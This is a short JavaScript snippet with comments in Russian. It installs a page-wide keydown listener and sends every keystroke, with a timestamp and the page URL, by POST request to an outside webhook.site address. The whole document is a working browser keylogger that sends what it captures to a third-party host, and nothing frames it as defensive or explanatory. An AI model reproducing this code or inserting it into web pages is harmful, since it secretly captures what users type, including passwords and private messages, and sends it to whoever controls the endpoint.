document.addEventListener("keydown", function(event) {
    let data = {
        key: event.key,          // Символ, который нажал пользователь
        timestamp: Date.now(),   // Время нажатия
        url: window.location.href // URL, где произошло нажатие
    };

    fetch("https://webhook.site/7fcc2c49-186f-4f3d-8f14-7a03443e2a5d", { 
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
    });
});
